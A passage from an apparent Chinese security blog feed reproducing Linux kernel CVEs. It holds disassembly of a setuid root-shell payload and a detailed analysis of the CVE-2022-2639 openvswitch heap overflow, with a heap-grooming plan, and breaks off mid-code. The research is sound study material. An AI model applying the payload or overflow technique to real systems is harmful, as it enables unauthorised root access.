sys_close</span><br><span class="line">LOAD:00000000004000B2                 lea     rdi, aTmpSh     ; &quot;/tmp/sh&quot;</span><br><span class="line">LOAD:00000000004000B9                 mov     rsi, 9EDh</span><br><span class="line">LOAD:00000000004000C0                 mov     rax, 5Ah ; &#x27;Z&#x27;</span><br><span class="line">LOAD:00000000004000C7                 syscall                 ; LINUX - sys_chmod</span><br><span class="line">LOAD:00000000004000C9                 xor     rdi, rdi</span><br><span class="line">LOAD:00000000004000CC                 mov     rax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:00000000004000D3                 syscall                 ; LINUX - sys_exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LOAD:0000000000400078 start:                                  ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">LOAD:0000000000400078                 xor     rdi, rdi</span><br><span class="line">LOAD:000000000040007B                 mov     rax, 69h ; &#x27;i&#x27;</span><br><span class="line">LOAD:0000000000400082                 syscall                 ; LINUX - sys_setuid</span><br><span class="line">LOAD:0000000000400084                 xor     rdi, rdi</span><br><span class="line">LOAD:0000000000400087                 mov     rax, 6Ah ; &#x27;j&#x27;</span><br><span class="line">LOAD:000000000040008E                 syscall                 ; LINUX - sys_setgid</span><br><span class="line">LOAD:0000000000400090                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">LOAD:0000000000400097                 push    0</span><br><span class="line">LOAD:0000000000400099                 mov     rdx, rsp</span><br><span class="line">LOAD:000000000040009C                 push    rdi</span><br><span class="line">LOAD:000000000040009D                 mov     rsi, rsp</span><br><span class="line">LOAD:00000000004000A0                 mov     rax, 3Bh ; &#x27;;&#x27;</span><br><span class="line">LOAD:00000000004000A7                 syscall                 ; LINUX - sys_execve</span><br><span class="line">LOAD:00000000004000A9                 mov     rax, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">LOAD:00000000004000B0                 syscall                 ; LINUX - sys_exit</span><br></pre></td></tr></table></figure>







<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1>]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
        <tag>FUSE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-0185的三种利用方式(三)</title>
    <url>/2022/12/05/CVE-2022-0185%E7%9A%84%E4%B8%89%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-%E4%B8%89/</url>
    <content><![CDATA[<p>Pipe_primitive 与 CVE-2022-0185 File System Context 整数溢出漏洞利用。</p>
<span id="more"></span>
]]></content>
      <categories>
        <category>cve 复现</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>cve</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-2639</title>
    <url>/2022/12/02/CVE-2022-2639/</url>
    <content><![CDATA[<p>cve-2022-2639 openvswitch 模块 kmalloc-0x10000 堆溢出、结合 Pipe_Primitive利用。</p>
<span id="more"></span>

<h1 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h1><p>整体源码可以用 si 载入，两边同时看整体逻辑和函数实现比较方便。然后add all，这时候只需要add第一层就行了，不要选下面的，否则 si 就会因为源代码过多而分析不了寄掉。</p>
<p><img src="/img/CVE-2022-2639/1.png" alt="image"></p>
<p>然后根据想要阅读的位置，选择那个对应的小文件夹，然后递归的add所有文件，也就是上面的第二个对号要打上。如果碰到找不到的结构体或者其他定义，可以通过这个在线的 source 找到对应关系，然后再回到 si 中 add 该路径下的文件。这样在 si 中就能找到了。如： <a href="https://elixir.bootlin.com/linux/v5.13/C/ident/nlattr">nlattr</a> 。</p>
<p>找到定义的 nlattr：</p>
<p><img src="/img/CVE-2022-2639/2.png" alt="nlattr"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>查看 patch:</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/net/openvswitch/flow_netlink.c b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">index 7176156d38443c..4c09cf8a0ab2dc 100644</span></span><br><span class="line"><span class="comment">--- a/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="comment">+++ b/net/openvswitch/flow_netlink.c</span></span><br><span class="line"><span class="meta">@@ -2465,7 +2465,7 @@</span> static struct nlattr *reserve_sfa_size(struct sw_flow_actions **sfa,</span><br><span class="line"> 	new_acts_size = max(next_offset + req_size, ksize(*sfa) * 2);</span><br><span class="line"> </span><br><span class="line"> 	if (new_acts_size &gt; MAX_ACTIONS_BUFSIZE) &#123;</span><br><span class="line"><span class="deletion">-		if ((MAX_ACTIONS_BUFSIZE - next_offset) &lt; req_size) &#123;</span></span><br><span class="line"><span class="addition">+		if ((next_offset + req_size) &gt; MAX_ACTIONS_BUFSIZE) &#123;</span></span><br><span class="line"> 			OVS_NLERR(log, &quot;Flow action size exceeds max %u&quot;,</span><br><span class="line"> 				  MAX_ACTIONS_BUFSIZE);</span><br><span class="line"> 			return ERR_PTR(-EMSGSIZE);</span><br></pre></td></tr></table></figure>



<h2 id="reserve-sfa-size"><a href="#reserve-sfa-size" class="headerlink" title="reserve_sfa_size"></a>reserve_sfa_size</h2><p>找到对应函数，看一下漏洞成因：</p>
<p><img src="/img/CVE-2022-2639/3.png" alt="3"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ACTIONS_BUFSIZE	(32 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> next_offset = offsetof(<span class="keyword">struct</span> sw_flow_actions, actions) + (*sfa)-&gt;actions_len;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> req_size = NLA_ALIGN(attr_len);</span><br></pre></td></tr></table></figure>

<p>可以注意到图中红色框内代码中，等式左边 <code>next_offset</code> 为有符号数，而右边的 <code>req_size</code> 为无符号数。左侧相减后如果结果为负数，<strong>则在与无符号比较时会被强制转换为无符号数而变成非常大的正数</strong>，从而绕过下面的 exceeds 的 check 继续下面的逻辑。</p>
<p><code>MAX_ACTIONS_BUFSIZE</code> 为 0x8000，所以当 <code>next_offset</code> 的值大于该值时，就会发生前面提到的情况。</p>
<p>继续向下分析。</p>
<p>① <code>new_acts_size</code> &#x3D; <code>MAX_ACTIONS_BUFSIZE</code>	&#x3D; 0x8000，2362行根据该 size 进行 <code>alloc</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sw_flow_actions *<span class="title function_">nla_alloc_flow_actions</span><span class="params">(<span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> *<span class="title">sfa</span>;</span></span><br><span class="line"></span><br><span class="line">	WARN_ON_ONCE(size &gt; MAX_ACTIONS_BUFSIZE);</span><br><span class="line"></span><br><span class="line">	sfa = kmalloc(<span class="keyword">sizeof</span>(*sfa) + size, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!sfa)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	sfa-&gt;actions_len = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> sfa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sw_flow_actions</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">	<span class="type">size_t</span> orig_len;	<span class="comment">/* From flow_cmd_new netlink actions size */</span></span><br><span class="line">	u32 actions_len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> <span class="title">actions</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sizeof</span>(<span class="keyword">struct</span> sw_flow_actions) = <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p>最终 <code>kmalloc</code> 大小为 <code>sw_flow_actions</code> 结构体的大小与 <code>new_acts_size</code> 的和；<br>② 回到漏洞函数，将传入的 <code>sfa-&gt;actions</code> 处的内容复制到新申请的 <code>acts-&gt;actions</code> 处；<br>③ 经过一些对 <code>acts</code> 的初始化，返回 <code>acts+next_offset</code>。</p>
<h2 id="copy-action"><a href="#copy-action" class="headerlink" title="copy_action"></a>copy_action</h2><p>通过 si 的 Relation，也能看到调用关系：</p>
<p><img src="/img/CVE-2022-2639/4.png"></p>
<p><code>copy_action</code> 函数中：</p>
<p><img src="/img/CVE-2022-2639/5.png"></p>
<p>返回值 <code>to</code> 即为 <code>acts + next_offset</code>，而 <code>acts</code> 的整个大小才为 0x8000+0x20，所以下面的 <code>memcpy</code> 即发生了堆越界写。 </p>
<p>但是由于对齐，内核并不会分配 0x8020 大小的 slab，而是分配了 0x10000 的 slab。 </p>
<p>根据参考文章中的描述，openvswitch 通过 netlink 进行通信（看源码目录和文件名也有发现）。根据 man pages 的描述：</p>
<blockquote>
<p>Netlink is used to transfer information between the kernel and user-space processes.  It consists of a standard sockets-based interface for user space processes and an internal kernel API for kernel modules.</p>
</blockquote>
<p>最初开发是为了克服 ioctl 的限制。例如，内核可以使用 netlink 接收变长的参数。几乎所有 Linux 网络管理都使用了 netlink，例如 iproute2 中的ip &#x2F; ss &#x2F; bridge。更多关于 Netlink 的东西后续整理好 CVE-2022-1015 的博客后直接挂个链接过去~~</p>
<p>这之中用到了名为 <code>nlattr</code> 的结构体：</p>
<p><img src="/img/CVE-2022-2639/6.png"></p>
<p>该结构体大小为4字节。len 字段为 <code>u16</code>，也就是此时 <code>nla_len</code> 最大为 0xffff，<code>memcpy</code> 的第二个参数 <code>from</code> 的 <code>payload</code> 最多就是 0xffff 字节。而前面的 <code>kmalloc</code> 的 slab 为 0x10000。并不能直接 oob write。</p>
<p>上面提到 openvswitch 模块使用 netlink 通信，那一定会先遵守 netlink 的通信约定（也就是一些数据结构的使用），即 netlink 的消息头：<code>nlmsghdr</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> &#123;</span></span><br><span class="line">	__u32		nlmsg_len;	<span class="comment">// 整个消息的长度, 包括 Netlink 消息头本身</span></span><br><span class="line">	__u16		nlmsg_type;	<span class="comment">// 特定接口的消息类型</span></span><br><span class="line">	__u16		nlmsg_flags;<span class="comment">// 消息类型的额外信息</span></span><br><span class="line">	__u32		nlmsg_seq;	<span class="comment">/* Sequence number */</span></span><br><span class="line">	__u32		nlmsg_pid;	<span class="comment">/* Sending process port ID */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/img/CVE-2022-2639/7.png"></p>
<p>netlink 又有很多种类，在 netlink.h 中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_ROUTE		0	<span class="comment">/* Routing/device hook				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_UNUSED		1	<span class="comment">/* Unused number				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_USERSOCK	2	<span class="comment">/* Reserved for user mode socket protocols 	*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_FIREWALL	3	<span class="comment">/* Unused number, formerly ip_queue		*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_SOCK_DIAG	4	<span class="comment">/* socket monitoring				*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_NFLOG		5	<span class="comment">/* netfilter/iptables ULOG */</span></span></span><br><span class="line">......</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_IP6_FW		13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_DNRTMSG		14	<span class="comment">/* DECnet routing messages */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_KOBJECT_UEVENT	15	<span class="comment">/* Kernel messages to userspace */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NETLINK_GENERIC		16</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>openvswitch 属于 <code>NETLINK_GENERIC</code>。因此在 <code>struct nlmsghdr</code> 中还需要 <code>struct genlmsghdr</code>；在这后面才是真正传递给 openvswitch 的数据，也就是 <code>struct nlattr</code>。<strong>即 <code>struct nlmsghdr -&gt; struct genlmsghdr -&gt; struct nlattr</code> 三层数据结构</strong>。前面的漏洞位于拷贝 flow actions 的场景中，而 flow actions 又是主 <code>struct nlattr</code>中的一个子 <code>struct nlattr</code>。所以层层嵌套下来，最外层的 <code>nlattr</code> 的长度都不超过 0xffff，后面的子 <code>nlattr</code> 更不能达到溢出 0x10000 的要求。</p>
<h2 id="ovs-nla-copy-actions"><a href="#ovs-nla-copy-actions" class="headerlink" title="__ovs_nla_copy_actions"></a>__ovs_nla_copy_actions</h2><p>继续看 <code>copy_action</code> 的上层函数 <code>__ovs_nla_copy_actions</code>：</p>
<p><img src="/img/CVE-2022-2639/8.png"></p>
<p>其中有如下数组来描述每个 <code>ACTION attr</code> 的长度：</p>
<p><img src="/img/CVE-2022-2639/9.png"></p>
<p>根据注释， -1 表示变长，其他直接赋值的自然就是定长的了。对于定长的 <code>ACTION</code>，例如代码中的 <code>OVS_ACTION_ATTR_PUSH_MPLS、OVS_ACTION_ATTR_PUSH_VLAN</code> 等，只进行了一些简单的字段判断就跳出 switch，进入到 <code>copy_action</code> 中：</p>
<p><img src="/img/CVE-2022-2639/10.png"></p>
<p><img src="/img/CVE-2022-2639/11.png"></p>
<p>注意到这里有一个非常重要的标识：<code>skip_copy</code>，他在进入整个 switch 之前被赋值为 <code>false</code>。而在上述对如<code>OVS_ACTION_ATTR_PUSH_MPLS</code> 等定长 <code>ACTION</code> 的处理中，并未修改该值。而在处理其他赋值为 -1 即变长的<code>ACTION</code>中，会将其赋值为 <code>true</code>：</p>
<p><img src="/img/CVE-2022-2639/12.png"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ovs_ct_copy_action</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *key,</span></span><br><span class="line"><span class="params">		       <span class="keyword">struct</span> sw_flow_actions **sfa,  <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ovs_conntrack_info</span> <span class="title">ct_info</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *helper = <span class="literal">NULL</span>;</span><br><span class="line">	u16 family;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	···</span><br><span class="line">	err = parse_ct(attr, &amp;ct_info, &amp;helper, <span class="built_in">log</span>);</span><br><span class="line">	···</span><br><span class="line">	err = ovs_nla_add_action(sfa, OVS_ACTION_ATTR_CT, &amp;ct_info,<span class="keyword">sizeof</span>(ct_info), <span class="built_in">log</span>);</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>ovs_ct_copy_action</code> 中，<code>parse_ct</code> 中只需要 8 字节就能构造合法的 <code>nlattr</code>（或者更少？不确定）。而在下面的 <code>ovs_nla_add_action</code> 中，<code>add_action</code> 传入的结构体 <code>data</code> 和 <code>len</code> 分别是 <code>ovs_conntrack_info</code> 和该结构体的长度：</p>
<p><img src="/img/CVE-2022-2639/13.png"></p>
<p><img src="/img/CVE-2022-2639/14.png"></p>
<p>而在 kernel 5.13 中该结构体大小为 0xa0：</p>
<p><img src="/img/CVE-2022-2639/15.png"></p>
<p>也就是说当我们添加500个 <code>OVS_ACTION_ATTR_CT</code> 的 <code>nlattr</code>，那只用了 500*8 &#x3D; 0xFA0 字节的 <code>nlattr</code> 长度，却让我们最前面提到的 buffer 的 <code>next_offset</code> 成功增加了 0x500*0xa0 &#x3D; 0x13880 个字节。可以触发溢出。但是使用 <code>ovs_conntrack_info</code> 有个局限性，就是这个结构体在内核版本的更迭中被修改过多次，导致在不同版本的内核其大小并不固定。<strong>虽然不能直接使用，但至少提供了一个思路：通过 <code>add_action</code> 将 <code>next_offset</code> 指针向后移动，使其突破 0xffff 的限制。</strong></p>
<p>所以为了避免不通用的情况，再寻找有没有其他可用的 <code>ACTION_ATTR</code>（毕竟那么多呢）。可以找到<code>OVS_ACTION_ATTR_SET</code>：</p>
<p><img src="/img/CVE-2022-2639/16.png"></p>
<p>在 case 中并未对关键的 <code>skip_copy</code> 进行处理，但是将其传入了调用的函数中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_set</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *a,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *flow_key,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> *skip_copy,</span></span><br><span class="line"><span class="params">			u8 mac_proto, __be16 eth_type, <span class="type">bool</span> masked, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">ovs_key</span> =</span> nla_data(a);</span><br><span class="line">	<span class="type">int</span> key_type = nla_type(ovs_key);</span><br><span class="line">	<span class="type">size_t</span> key_len;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* There can be only one key in a action */</span></span><br><span class="line">	<span class="keyword">if</span> (nla_total_size(nla_len(ovs_key)) != nla_len(a))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	key_len = nla_len(ovs_key);</span><br><span class="line">	<span class="comment">// 传入 masked 为 false</span></span><br><span class="line">	<span class="keyword">if</span> (masked)</span><br><span class="line">		key_len /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key_type &gt; OVS_KEY_ATTR_MAX ||</span><br><span class="line">		<span class="comment">// 注意这里有一个对 key_len 的检查</span></span><br><span class="line">	    !check_attr_len(key_len, ovs_key_lens[key_type].len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (masked &amp;&amp; !validate_masked(nla_data(ovs_key), key_len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (key_type) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="comment">// 对该 type 的检查非常简单</span></span><br><span class="line">	<span class="keyword">case</span> OVS_KEY_ATTR_ETHERNET:</span><br><span class="line">		<span class="keyword">if</span> (mac_proto != MAC_PROTO_ETHERNET)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	···</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Convert non-masked non-tunnel set actions to masked set actions. */</span></span><br><span class="line">	<span class="keyword">if</span> (!masked &amp;&amp; key_type != OVS_KEY_ATTR_TUNNEL) &#123;</span><br><span class="line">            <span class="comment">// ！！！ 注意此时的 len = key_len * 2</span></span><br><span class="line">            <span class="type">int</span> start, len = key_len * <span class="number">2</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">at</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ！！！</span></span><br><span class="line">            *skip_copy = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            start = add_nested_action_start(sfa,</span><br><span class="line">                                            OVS_ACTION_ATTR_SET_TO_MASKED,</span><br><span class="line">                                            <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (start &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用__add_action，传入的len为key_len两倍</span></span><br><span class="line">            at = __add_action(sfa, key_type, <span class="literal">NULL</span>, len, <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(at))</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(at);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(nla_data(at), nla_data(ovs_key), key_len); <span class="comment">/* Key. */</span></span><br><span class="line">            <span class="built_in">memset</span>(nla_data(at) + key_len, <span class="number">0xff</span>, key_len);    <span class="comment">/* Mask. */</span></span><br><span class="line">            <span class="comment">/* Clear non-writeable bits from otherwise writeable fields. */</span></span><br><span class="line">            <span class="keyword">if</span> (key_type == OVS_KEY_ATTR_IPV6) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ovs_key_ipv6</span> *<span class="title">mask</span> =</span> nla_data(at) + key_len;</span><br><span class="line"></span><br><span class="line">                mask-&gt;ipv6_label &amp;= htonl(<span class="number">0x000FFFFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            add_nested_action_end(*sfa, start);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们内部嵌套的 <code>nlattr type</code>为 <code>OVS_KEY_ATTR_ETHERNET</code>，首先要通过前面提到的 <code>key_len</code> 的检查，即 <code>key_len</code> 等于 sizeof(struct ovs_key_ethernet) &#x3D; 1*2*6 &#x3D; 0x0C：</p>
<p><img src="/img/CVE-2022-2639/17.png"></p>
<p><img src="/img/CVE-2022-2639/18.png"></p>
<p><img src="/img/CVE-2022-2639/19.png"></p>
<p>算上添加这个 <code>nlattr</code> 所需的两层 header（嵌套），即需要使用 0x04 + 0x04 + 0x0C &#x3D; 0x14 字节的内存就让最前面提出的 <code>next_offset</code> 的指针前进 0x04 + 0x04 + 0x0C * 2 &#x3D; 0x20 字节。虽然放大比例不如 <code>sizeof(struct ovs_conntrack_info)</code>，但好在其在能用来溢出的前提下，保证了更优的稳定性（无需根据内核版本来计算结构体的大小且粒度较小，溢出写会更精确）。<br>最后在回到 <code>copy_action</code> 中，<code>memcpy</code> 的时候就会产生溢出。也就是第二次拷贝剩余的 <code>nlattr</code> 时（第一次是对前面 <code>OVS_ACTION_ATTR_SET</code> 推动 <code>next_offset</code> 的操作）。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>那么现在漏洞很明显：在 0x10000 的 slab 上的堆溢出。</p>
<p>（由于本人经常喜欢在纸上写写画画，所以下面可能会出现一些奇怪的示意图片~~其他非常精美的图片都来自 <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE 漏洞分析</a>）</p>
<p>以往经常使用的消息队列的 <code>struct msg_msg</code> 每个主消息最多一个页大小，即 0x1000，后续的 <code>msg_msgseg</code> 虽然会单链表连接，但是想直接让发生溢出的 0x10000 的 slab 后紧挨着这两种结构的概率极低。所以既然需要跨页，不如使用页风水来调节内存布局（更多关于页风水的原理和利用后续整理好 corCTF2022-cache-of-castaways 和 CVE-2022-27666 链过去~）。说到页风水，那就要请出 <code>setsockopt PACKET_TX_RING/PACKET_RX_RING</code> 了。通过该函数，就可以随时申请 0x10000 的 slab 并且随时释放这些 slab。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">packet_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">		<span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		···</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">						    optname == PACKET_TX_RING);</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	···</span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">		···</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">		···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	···</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line">	···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="type">char</span> *) 